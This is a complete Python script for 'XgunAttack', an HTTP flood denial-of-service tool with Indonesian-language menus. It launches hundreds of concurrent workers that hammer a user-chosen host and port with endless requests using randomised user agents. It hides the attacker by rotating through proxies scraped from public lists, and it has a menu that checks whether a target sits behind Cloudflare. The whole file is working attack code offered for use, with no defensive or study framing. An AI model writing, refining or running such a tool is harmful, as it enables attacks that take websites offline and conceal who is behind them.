import asyncio
import aiohttp
import random
import time
import os
import sys
import threading
import requests
import re
from fake_useragent import UserAgent
from colorama import Fore, Style, init

init(autoreset=True)

PROXY_FILE = "proxies.txt"
IP_ROTATE_INTERVAL = 30
THREADS_DEFAULT = 500
TIMEOUT = 5

ua = UserAgent()
active_proxies = []
lock = threading.Lock()

def banner():
    os.system("clear")
    print(f"""{Fore.RED}
╭───〔 {Fore.WHITE}𝗫𝗴𝘂𝗻𝗔𝘁𝘁𝗮𝗰𝗸{Fore.RED} 〕───
│   ██╗  ██╗ ██████╗ ██╗   ██╗███╗   ██╗ █████╗ ████████╗████████╗ █████╗  ██████╗██╗  ██╗
│   ╚██╗██╔╝██╔════╝ ██║   ██║████╗  ██║██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔════╝██║ ██╔╝
│    ╚███╔╝ ██║  ███╗██║   ██║██╔██╗ ██║███████║   ██║      ██║   ███████║██║     █████╔╝
│    ██╔██╗ ██║   ██║██║   ██║██║╚██╗██║██╔══██║   ██║      ██║   ██╔══██║██║     ██╔═██╗
│   ██╔╝ ██╗╚██████╔╝╚██████╔╝██║ ╚████║██║  ██║   ██║      ██║   ██║  ██║╚██████╗██║  ██╗
│   ╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═══╝╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝
│
│   {Fore.YELLOW}by {Fore.WHITE}XioXploit {Fore.RED}│ {Fore.YELLOW}Dark Media Edition {Fore.RED}│ {Fore.YELLOW}v2.1
╰──────────────────────────────
{Style.RESET_ALL}""")

def main_menu():
    print(f"""{Fore.CYAN}
╭───〔 {Fore.YELLOW}MAIN MENU{Fore.CYAN} 〕───
│
│  {Fore.GREEN}#> [1]{Fore.WHITE} Attack
│  {Fore.GREEN}#> [2]{Fore.WHITE} Chek Target
│  {Fore.GREEN}#> [3]{Fore.WHITE} Tes Proxy
│  {Fore.GREEN}#> [4]{Fore.WHITE} Scrape Proxy
│  {Fore.GREEN}#> [5]{Fore.WHITE} Lihat Proxy
│  {Fore.GREEN}#> [0]{Fore.WHITE} Exit
│
╰──────────────────────────────
{Style.RESET_ALL}""")

def load_proxies():
    global active_proxies
    if not os.path.exists(PROXY_FILE):
        open(PROXY_FILE, "w").close()
        with lock:
            active_proxies = []
        return []
    with open(PROXY_FILE, "r") as f:
        proxies = [line.strip() for line in f if line.strip() and not line.startswith("#")]
    with lock:
        active_proxies = proxies
    return proxies


def get_proxy():
    with lock:
        if not active_proxies:
            return None
        return random.choice(active_proxies)


def proxy_rotator():
    while True:
        time.sleep(IP_ROTATE_INTERVAL)
        load_proxies()
        print(f"\n{Fore.CYAN}╭─[ {Fore.YELLOW}IP ROTATED{Fore.CYAN} ]─ @ {time.strftime('%H:%M:%S')} — {Fore.GREEN}{len(active_proxies)} proxy{Fore.CYAN}")
        print(f"╰─> {Fore.WHITE}Rotasi otomatis tiap {IP_ROTATE_INTERVAL}s{Style.RESET_ALL}\n")

async def flood_worker(session, target, worker_id, port, host):
    headers = {
        "User-Agent": ua.random,
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.9",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive",
        "Cache-Control": "no-cache",
        "Pragma": "no-cache",
        "Host": f"{host}:{port}",
    }
    proxy = get_proxy()
    proxy_url = f"http://{proxy}" if proxy else None

    while True:
        try:
            async with session.get(
                target,
                headers=headers,
                proxy=proxy_url,
                timeout=aiohttp.ClientTimeout(total=TIMEOUT),
                ssl=False,
                allow_redirects=False
            ) as resp:
                status = resp.status
                color = Fore.GREEN if status < 400 else Fore.YELLOW if status < 500 else Fore.RED
                print(f"{color}[W{worker_id}] {status} │ {Fore.CYAN}{proxy or 'LOCAL'}{Fore.WHITE} │ {host}:{port}")
            # Rotasi proxy tiap request
            proxy = get_proxy()
            proxy_url = f"http://{proxy}" if proxy else None
        except asyncio.TimeoutError:
            print(f"{Fore.RED}[W{worker_id}] TIMEOUT │ {proxy or 'LOCAL'} │ {host}:{port}")
        except Exception as e:
            print(f"{Fore.RED}[W{worker_id}] ERR: {str(e)[:50]}")
        await asyncio.sleep(0.01)


async def attack(target, threads, port, host):
    connector = aiohttp.TCPConnector(
        limit=0,
        ttl_dns_cache=300,
        ssl=False,
        force_close=False,
        enable_cleanup_closed=True,
    )
    async with aiohttp.ClientSession(connector=connector) as session:
        tasks = [
            asyncio.create_task(flood_worker(session, target, i, port, host))
            for i in range(threads)
        ]
        await asyncio.gather(*tasks)


def menu_attack():
    print(f"\n{Fore.RED}╭───〔 {Fore.YELLOW}ATTACK MODE{Fore.RED} 〕───")

    # Threads (recommended 1-500)
    while True:
        try:
            threads_input = input(f"│ {Fore.WHITE}#> [0] Threads : {Fore.CYAN}(1-500 recommen) > ").strip()
            threads = int(threads_input) if threads_input else THREADS_DEFAULT
            if threads < 1:
                threads = 1
            elif threads > 500:
                print(f"{Fore.YELLOW}│ [!] Max recommen 500, tetep lanjut dengan {threads}...{Fore.RED}")
            break
        except ValueError:
            print(f"{Fore.YELLOW}│ [!] Masukin angka Tuan.{Fore.RED}")

 
    try:
        port_input = input(f"{Fore.RED}│ {Fore.WHITE}#> [0] Port    : {Fore.CYAN}").strip()
        port = int(port_input) if port_input else 80
    except ValueError:
        port = 80

    
    raw_target = input(f"{Fore.RED}│ {Fore.WHITE}#> [0] Target  : {Fore.CYAN}").strip()

   
    clean = raw_target.replace("https://", "").replace("http://", "").split("/")[0]

    if ":" not in clean:
        host = clean
        final_port = port
    else:
        host, final_port = clean.split(":")
        try:
            final_port = int(final_port)
        except ValueError:
            final_port = port

    
    scheme = "https" if final_port in (443, 8443) else "http"
    target = f"{scheme}://{host}:{final_port}"

    print(f"{Fore.RED}╰──────────────────────────────{Style.RESET_ALL}")

    
    confirm = input(f"{Fore.YELLOW}#> [88] Attack  : on(jalan) > {Style.RESET_ALL}").strip().lower()
    if confirm not in ("on", "jalan", "y", "yes", "1"):
        print(f"{Fore.RED}[!] Attack dibatalkan Tuan.{Style.RESET_ALL}")
        time.sleep(1)
        return

    print(f"\n{Fore.RED}╭─[ {Fore.YELLOW}ATTACK STARTED{Fore.RED} ]─")
    print(f"│ Host     : {Fore.WHITE}{host}")
    print(f"│ Port     : {Fore.WHITE}{final_port}")
    print(f"│ URL      : {Fore.WHITE}{target}")
    print(f"│ Threads  : {Fore.WHITE}{threads}")
    print(f"│ Rotasi   : {Fore.WHITE}every {IP_ROTATE_INTERVAL}s")
    print(f"│ Proxy    : {Fore.WHITE}{len(active_proxies)} aktif")
    print(f"│ Author   : {Fore.WHITE}XioXploit")
    print(f"╰─> {Fore.RED}Tekan CTRL+C buat stop{Style.RESET_ALL}\n")

    
    t = threading.Thread(target=proxy_rotator, daemon=True)
    t.start()

    try:
        asyncio.run(attack(target, threads, final_port, host))
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[!] Attack dihentikan Tuan.{Style.RESET_ALL}")
        input(f"{Fore.CYAN}Enter buat balik ke menu...{Style.RESET_ALL}")

def menu_chek():
    print(f"\n{Fore.RED}╭───〔 {Fore.YELLOW}CHEK TARGET{Fore.RED} 〕───")
    target = input(f"│ {Fore.WHITE}Target URL  : {Fore.CYAN}").strip()
    if not target.startswith("http"):
        target = "http://" + target
    print(f"{Fore.RED}╰──────────────────────────────{Style.RESET_ALL}\n")

    print(f"{Fore.CYAN}[*] Ngecek target...\n")
    try:
        start = time.time()
        r = requests.get(target, timeout=10, headers={"User-Agent": ua.random})
        elapsed = (time.time() - start) * 1000

        print(f"{Fore.RED}╭─[ {Fore.YELLOW}HASIL{Fore.RED} ]─")
        print(f"│ Status Code : {Fore.GREEN}{r.status_code}")
        print(f"│ Response    : {Fore.WHITE}{elapsed:.2f} ms")
        print(f"│ Server      : {Fore.WHITE}{r.headers.get('Server', 'Unknown')}")
        print(f"│ Content-Type: {Fore.WHITE}{r.headers.get('Content-Type', 'Unknown')}")
        print(f"│ Cloudflare  : {Fore.GREEN if 'cloudflare' in str(r.headers).lower() else Fore.RED}{'YES' if 'cloudflare' in str(r.headers).lower() else 'NO'}")
        print(f"│ Powered By  : {Fore.WHITE}{r.headers.get('X-Powered-By', 'Unknown')}")
        print(f"╰──────────────────────────────{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}[!] Error: {e}{Style.RESET_ALL}")

    input(f"\n{Fore.CYAN}Enter buat balik ke menu...{Style.RESET_ALL}")


def menu_test_proxy():
    print(f"\n{Fore.RED}╭───〔 {Fore.YELLOW}TES PROXY{Fore.RED} 〕───")
    load_proxies()
    total = len(active_proxies)
    if total == 0:
        print(f"│ {Fore.RED}[!] Proxy kosong. Scrape dulu (menu 4).")
        print(f"╰──────────────────────────────{Style.RESET_ALL}")
        input(f"\n{Fore.CYAN}Enter buat balik...{Style.RESET_ALL}")
        return

    print(f"│ {Fore.WHITE}Total proxy : {Fore.CYAN}{total}")
    test_url = input(f"│ {Fore.WHITE}Test URL    : {Fore.CYAN}").strip() or "http://httpbin.org/ip"
    print(f"{Fore.RED}╰──────────────────────────────{Style.RESET_ALL}\n")

    alive = 0
    dead = 0
    for p in active_proxies[:20]:
        try:
            r = requests.get(
                test_url,
                proxies={"http": f"http://{p}", "https": f"http://{p}"},
                timeout=5
            )
            if r.status_code == 200:
                alive += 1
                print(f"{Fore.GREEN}[✓] {p} → ALIVE ({r.elapsed.total_seconds()*1000:.0f}ms)")
            else:
                dead += 1
                print(f"{Fore.YELLOW}[!] {p} → {r.status_code}")
        except Exception:
            dead += 1
            print(f"{Fore.RED}[✗] {p} → DEAD")

    print(f"\n{Fore.CYAN}╭─[ {Fore.YELLOW}SUMMARY{Fore.CYAN} ]─")
    print(f"│ Alive : {Fore.GREEN}{alive}")
    print(f"│ Dead  : {Fore.RED}{dead}")
    print(f"╰──────────────────────────────{Style.RESET_ALL}")
    input(f"\n{Fore.CYAN}Enter buat balik...{Style.RESET_ALL}")


def menu_scrape():
    print(f"\n{Fore.RED}╭───〔 {Fore.YELLOW}SCRAPE PROXY{Fore.RED} 〕───")
    print(f"│ {Fore.WHITE}Ambil proxy dari GitHub sources...")
    print(f"╰──────────────────────────────{Style.RESET_ALL}\n")

    sources = [
        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
        "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
        "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
        "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
    ]

    all_proxies = set()
    for src in sources:
        try:
            r = requests.get(src, timeout=10)
            found = re.findall(r"\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d{2,5}", r.text)
            all_proxies.update(found)
            print(f"{Fore.GREEN}[✓] {src.split('/')[-1]} → {len(found)} proxy")
        except Exception:
            print(f"{Fore.RED}[✗] Gagal: {src[:50]}")

    with open(PROXY_FILE, "w") as f:
        for p in sorted(all_proxies):
            f.write(p + "\n")

    load_proxies()
    print(f"\n{Fore.CYAN}╭─[ {Fore.YELLOW}DONE{Fore.CYAN} ]─")
    print(f"│ Total saved : {Fore.GREEN}{len(all_proxies)}")
    print(f"│ File        : {Fore.WHITE}proxies.txt")
    print(f"╰──────────────────────────────{Style.RESET_ALL}")
    input(f"\n{Fore.CYAN}Enter buat balik...{Style.RESET_ALL}")


def menu_lihat_proxy():
    print(f"\n{Fore.RED}╭───〔 {Fore.YELLOW}LIST PROXY{Fore.RED} 〕───")
    load_proxies()
    if not active_proxies:
        print(f"│ {Fore.RED}[!] Kosong.")
    else:
        for i, p in enumerate(active_proxies[:50], 1):
            print(f"│ {Fore.GREEN}{i:>3}.{Fore.WHITE} {p}")
        if len(active_proxies) > 50:
            print(f"│ {Fore.YELLOW}... dan {len(active_proxies)-50} lainnya")
    print(f"{Fore.RED}╰──────────────────────────────{Style.RESET_ALL}")
    input(f"\n{Fore.CYAN}Enter buat balik...{Style.RESET_ALL}")


def main():
    load_proxies()
    while True:
        banner()
        main_menu()
        choice = input(f"{Fore.YELLOW}┌─[ {Fore.WHITE}Pilih Menu{Fore.YELLOW} ]─> {Style.RESET_ALL}").strip()

        if choice == "1":
            menu_attack()
        elif choice == "2":
            menu_chek()
        elif choice == "3":
            menu_test_proxy()
        elif choice == "4":
            menu_scrape()
        elif choice == "5":
            menu_lihat_proxy()
        elif choice == "0":
            print(f"\n{Fore.RED}╭─[ {Fore.YELLOW}EXIT{Fore.RED} ]─")
            print(f"│ {Fore.WHITE}Bye Tuan. XgunAttack by XioXploit")
            print(f"│ {Fore.WHITE}BOT BY: ANGGA GANTENG ACUUU")
            print(f"╰──────────────────────────────{Style.RESET_ALL}\n")
            sys.exit(0)
        else:
            print(f"{Fore.RED}[!] Pilihan gak valid Tuan.")
            time.sleep(1)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[!] Force exit.{Style.RESET_ALL}")
        sys.exit(0)